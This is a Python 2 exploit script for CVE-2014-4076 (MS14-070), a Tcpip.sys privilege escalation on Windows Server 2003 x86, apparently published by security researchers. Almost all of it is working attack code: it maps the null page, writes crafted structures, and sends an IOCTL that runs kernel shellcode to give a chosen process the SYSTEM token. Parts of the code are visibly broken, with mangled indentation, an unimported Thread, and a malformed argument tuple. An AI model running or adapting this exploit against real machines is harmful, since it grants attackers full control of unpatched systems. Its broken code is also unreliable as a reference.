#!/usr/bin/python2
     #
     # KL-001-2015-001 / MS14-070 / CVE-2014-4076
     # Microsoft Windows Server 2003 x86 Tcpip.sys Privilege Escalation
     # Matt Bergin @ KoreLogic / Level @ Smash the Stack
     # shout out to bla
     #

     from optparse import OptionParser
     from subprocess import Popen
     from os.path import exists
     from struct import pack
     from time import sleep
     from ctypes import *
     from sys import exit

     CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory = 
windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory
     DeviceIoControlFile,CloseHandle = windll.ntdll.ZwDeviceIoControlFile,windll.kernel32.CloseHandle
     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0

     def spawn_process(path):
         process = Popen([path],shell=True)
         pid = process.pid
         return

     def main():
         print "CVE-2014-4076 x86 exploit, Level\n"
         global pid, process
         parser = OptionParser()
         parser.add_option("--path",dest="path",help="path of process to start and elevate")
         parser.add_option("--pid",dest="pid",help="pid of running process to elevate")
         o,a = parser.parse_args()
         if (o.path == None and o.pid == None):
             print "[!] no path or pid set"
             exit(1)
         else:
             if (o.path != None):
           if (exists(o.path) != True):
         print "[!] path does not exist"
         exit(1)
           else:
                   Thread(target=spawn_process,args=(o.path),name='attacker-cmd').start()
             if (o.pid != None):
                 try:
                     pid = int(o.pid)
                 except:
                     print "[!] could not convert PID to an interger."
                     exit(1)
         while True:
                 if ("pid" not in globals()):
                     sleep(1)
                 else:
                     print "[+] caught attacker cmd at %s, elevating now" % (pid)
                     break
         buf = 
"\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
         sc = 
"\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00"
         sc = sc.replace("\x41\x41\x41\x41",pack('<L',pid))
         sc = sc.replace("\x11\x11\x11\x11","\x39\xff\xa2\xba")
         sc = sc.replace("\x22\x22\x22\x22","\x00\x00\x00\x00")           
         handle = CreateFileA("\\\\.\\Tcp",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
         if (handle == -1):
             print "[!] could not open handle into the Tcp device"
             exit(1)
         print "[+] allocating memory"              
         ret_one = NtAllocateVirtualMemory(-1,byref(c_int(0x1000)),0x0,byref(c_int(0x4000)),0x1000|0x2000,0x40)
         if (ret_one != 0):
             print "[!] could not allocate memory..."
             exit(1)
         print "[+] writing relevant memory..."
         ret_two = WriteProcessMemory(-1, 0x28, "\x87\xff\xff\x38", 4, byref(c_int(0)))
         ret_three = WriteProcessMemory(-1, 0x38, "\x00"*2, 2, byref(c_int(0)))
         ret_four = WriteProcessMemory(-1, 0x1100, buf, len(buf), byref(c_int(0)))
         ret_five = WriteProcessMemory(-1, 0x2b, "\x00"*2, 2, byref(c_int(0)))
         ret_six = WriteProcessMemory(-1, 0x2000, sc, len(sc), byref(c_int(0)))
         print "[+] attack setup done, crane kick!"
         DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x00120028,0x1100,len(buf),0x0,0x0)
         CloseHandle(handle)
         exit(0)

     if __name__=="__main__":
         main()

